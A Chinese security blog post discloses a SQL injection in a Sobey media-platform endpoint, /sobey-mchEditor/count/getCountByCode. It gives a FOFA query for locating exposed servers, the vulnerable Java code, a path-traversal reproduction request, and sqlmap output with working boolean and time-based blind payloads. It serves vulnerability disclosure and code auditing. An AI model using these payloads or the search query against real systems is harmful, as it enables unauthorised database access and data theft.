---
title: "索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-getCountByCode-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditorcountgetcountbycode-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/25 20:23
- 645浏览
- [0评论](#comment)
- 50分钟阅读

深入探索

Windows安全工具

Web安全书籍

漏洞扫描器

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/count/getCountByCode 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`count/getCountByCode`的实现逻辑

```
@RequestMapping(
    value = {"/getCountByCode"},
    method = {RequestMethod.GET}
)
public Response getCountByCode(@RequestParam(value = "userCode",required = false) String userCode, @RequestParam(value = "channelCode",required = false) String channelCode, @RequestParam(value = "status",required = false) String status, @RequestParam(value = "time",defaultValue = "7") int time, @RequestParam(value = "orderType",required = false) String orderType, @RequestParam(value = "createDate",required = false) String createDate) {
    Response response = new Response();
    StringBuffer wzSql = new StringBuffer(" select a.createUserCode userCode,MAX(a.createusername) userName,count(1) website ,0 sina,0 wechat from zcnarticle a WHERE a.type='1' ");
    StringBuffer wbSql = new StringBuffer(" select b.createUserCode userCode,MAX(b.createusername) userName,0 website,count(1) sina,0 wechat from zcnarticle b WHERE b.type='6' ");
    StringBuffer wxSql = new StringBuffer(" SELECT c.createUserCode userCode,MAX(c.createusername) userName,0 website,0 sina,count(1) wechat from zcnwxarticle c where 1=1 ");
    StringBuffer userCodeSql = new StringBuffer();
    if (StringUtil.isNotEmpty(userCode)) {
        String[] channels = userCode.split(",");

        for(int i = 0; i < channels.length; ++i) {
            userCodeSql.append("'").append(channels[i]).append("'");
            if (i != channels.length - 1) {
                userCodeSql.append(",");
            }
        }

        wzSql.append(" and a.createUserCode in ( ").append(userCodeSql.toString()).append(" ) ");
        wbSql.append(" and b.createUserCode in ( ").append(userCodeSql.toString()).append(" )");
        wxSql.append(" and c.createUserCode in ( ").append(userCodeSql.toString()).append(" )");
    }

    if (StringUtil.isNotEmpty(status)) {
        wzSql.append(" and a.status = " + status);
        wbSql.append(" and b.status = " + status);
        wxSql.append(" and c.status = " + status);
    }

    if (StringUtil.isNotEmpty(createDate)) {
        wzSql.append(" and a.createdate > '" + createDate + "' ");
        wbSql.append(" and b.createdate > '" + createDate + "' ");
        wxSql.append(" and c.createdate > '" + createDate + "' ");
    }

    wzSql.append(" GROUP BY a.createUserCode ");
    wbSql.append(" GROUP BY b.createUserCode ");
    wxSql.append(" GROUP BY c.createUserCode ");
    StringBuffer sql = new StringBuffer("SELECT aa.userCode,aa.userName,sum(website) website,sum(sina) sina,sum(wechat) wechat FROM (");
    sql.append(wzSql).append(" UNION ALL  ").append(wbSql).append(" UNION ALL ").append(wxSql).append(" ) aa GROUP BY aa.userCode  ");
```

深入探索

安全

软件

云安全解决方案

参数**userCode**、**status**和**createDate**，均是无任何过滤或校验处理，被直接拼接到wzSql这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01'SQLI_POC&orderType=1&status=1&userCode=1&siteCode=1&token=1 HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞](images/img-001-185ffe4f71a3.webp)](https://image.mrxn.net/c30819ef0c95428b983ee0c2975aae9a.webp)

布尔注入获取所有usercode、username、website、sina以及wechat等字段信息。

代码安全审计

同样也支持延时注入

[![索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞](images/img-002-6d75578ed97c.webp)](https://image.mrxn.net/cbafab9a714f4587ac4f72d3fd06809c.webp)

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #2* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1 OR NOT 3129=3129&userCode=1&siteCode=1&token=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1 AND (SELECT 7203 FROM (SELECT(SLEEP(5)))Xjgf)&userCode=1&siteCode=1&token=1

Parameter: #3* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01&orderType=1&status=1&userCode=1' RLIKE (SELECT (CASE WHEN (3997=3997) THEN 1 ELSE 0x28 END)) AND 'eKym'='eKym&siteCode=1&token=1

Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01' OR NOT 6665=6665 AND 'puIy'='puIy&orderType=1&status=1&userCode=1&siteCode=1&token=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01' AND (SELECT 6067 FROM (SELECT(SLEEP(5)))ZuGP) AND 'SlgF'='SlgF&orderType=1&status=1&userCode=1&siteCode=1&token=1
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
